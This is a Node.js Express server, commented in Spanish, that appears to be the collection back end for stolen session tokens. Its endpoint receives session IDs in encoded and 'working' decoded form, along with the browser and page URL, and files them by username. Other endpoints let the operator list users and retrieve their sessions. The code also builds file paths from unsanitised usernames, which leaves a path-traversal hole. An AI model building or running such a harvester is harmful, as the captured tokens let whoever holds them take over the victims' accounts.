const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

const HISTORIAL_FILE = path.join(__dirname, 'session_history.json');
const SESSIONS_DIR = path.join(__dirname, 'sessions');

// Asegurarse de que el directorio de sesiones exista
if (!fs.existsSync(SESSIONS_DIR)) {
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

function cargarHistorial() {
    try {
        if (fs.existsSync(HISTORIAL_FILE)) {
            return JSON.parse(fs.readFileSync(HISTORIAL_FILE, 'utf8'));
        }
    } catch (error) {}
    return [];
}

function guardarHistorial(historial) {
    fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2));
}

// Función para guardar session ID en carpeta de usuario
function guardarSessionEnCarpetaUsuario(sessionId, decodedId, username, userAgent, url) {
    try {
        // Crear una carpeta para cada usuario si no existe
        const userDir = path.join(SESSIONS_DIR, username);
        if (!fs.existsSync(userDir)) {
            fs.mkdirSync(userDir, { recursive: true });
            console.log(`📁 Creada carpeta para usuario: ${username}`);
        }
        
        // Nombre del archivo: timestamp + username
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const fileName = `${timestamp}_${username}.json`;
        const filePath = path.join(userDir, fileName);
        
        // Crear el objeto de session
        const sessionData = {
            sessionId: sessionId,
            decodedId: decodedId,
            username: username,
            fecha: new Date().toISOString(),
            fechaLegible: new Date().toLocaleString('es-ES'),
            userAgent: userAgent || 'desconocido',
            url: url || 'desconocida'
        };
        
        // Guardar el archivo
        fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));
        console.log(`💾 Session ID guardado en: ${filePath}`);
        
        return true;
    } catch (error) {
        console.error('Error al guardar en carpeta de usuario:', error);
        return false;
    }
}

app.post('/save-session', (req, res) => {
    const { sessionId, decodedId, userAgent, url, organizeByUser } = req.body;
    const fecha = new Date();
    const username = decodedId ? decodedId.split(':')[0] : 'desconocido';
    
    const registro = {
        id: Date.now(),
        sessionId: sessionId,      // Original codificada
        decodedId: decodedId,       // Decodificada (la que sirve)
        username: username,
        fecha: fecha.toISOString(),
        fechaLegible: fecha.toLocaleString('es-ES'),
        userAgent: userAgent || 'desconocido',
        url: url || 'desconocida'
    };
    
    console.log('\n📥 NUEVA SESSION ID:');
    console.log('   Usuario:', username);
    console.log('   Codificada:', sessionId);
    console.log('   Decodificada:', decodedId);
    
    // Guardar en el historial tradicional (para compatibilidad)
    const historial = cargarHistorial();
    historial.unshift(registro);
    if (historial.length > 50) historial.pop();
    guardarHistorial(historial);
    
    // Guardar en carpeta de usuario si se solicita
    let carpetaGuardada = false;
    if (organizeByUser) {
        carpetaGuardada = guardarSessionEnCarpetaUsuario(sessionId, decodedId, username, userAgent, url);
    }
    
    // Responder con información sobre dónde se guardó
    res.json({ 
        success: true, 
        id: registro.id,
        savedInFolder: carpetaGuardada,
        message: carpetaGuardada ? `Session ID guardado en carpeta de @${username}` : 'Session ID guardado en historial general'
    });
});

app.get('/get-history', (req, res) => {
    res.json({ success: true, count: cargarHistorial().length, history: cargarHistorial() });
});

app.get('/get-user-sessions/:username', (req, res) => {
    const username = req.params.username;
    const userDir = path.join(SESSIONS_DIR, username);
    
    try {
        if (!fs.existsSync(userDir)) {
            return res.json({ success: true, count: 0, sessions: [] });
        }
        
        const files = fs.readdirSync(userDir);
        const sessions = [];
        
        files.forEach(file => {
            if (file.endsWith('.json')) {
                const filePath = path.join(userDir, file);
                const content = fs.readFileSync(filePath, 'utf8');
                sessions.push(JSON.parse(content));
            }
        });
        
        // Ordenar por fecha (más reciente primero)
        sessions.sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
        
        res.json({ success: true, count: sessions.length, sessions });
    } catch (error) {
        console.error('Error al obtener sesiones de usuario:', error);
        res.status(500).json({ success: false, message: 'Error al obtener sesiones de usuario' });
    }
});

app.get('/get-users', (req, res) => {
    try {
        if (!fs.existsSync(SESSIONS_DIR)) {
            return res.json({ success: true, users: [] });
        }
        
        const users = fs.readdirSync(SESSIONS_DIR).filter(user => {
            const userPath = path.join(SESSIONS_DIR, user);
            return fs.statSync(userPath).isDirectory();
        });
        
        res.json({ success: true, users });
    } catch (error) {
        console.error('Error al obtener lista de usuarios:', error);
        res.status(500).json({ success: false, message: 'Error al obtener lista de usuarios' });
    }
});

app.delete('/delete-session/:id', (req, res) => {
    const id = parseInt(req.params.id);
    let historial = cargarHistorial();
    const nuevo = historial.filter(h => h.id !== id);
    guardarHistorial(nuevo);
    res.json({ success: true });
});

app.delete('/clear-history', (req, res) => {
    guardarHistorial([]);
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║   🚀 SERVIDOR DE SESSION IDs ACTIVO   ║
╠════════════════════════════════════════╣
║   Puerto: ${PORT}                        ║
║   URL: http://localhost:${PORT}          ║
╠════════════════════════════════════════╣
║   ✅ Las session IDs se guardan        ║
║      en VERSION DECODIFICADA           ║
║   📁 También se organizan por usuario  ║
╚════════════════════════════════════════╝
    `);
});
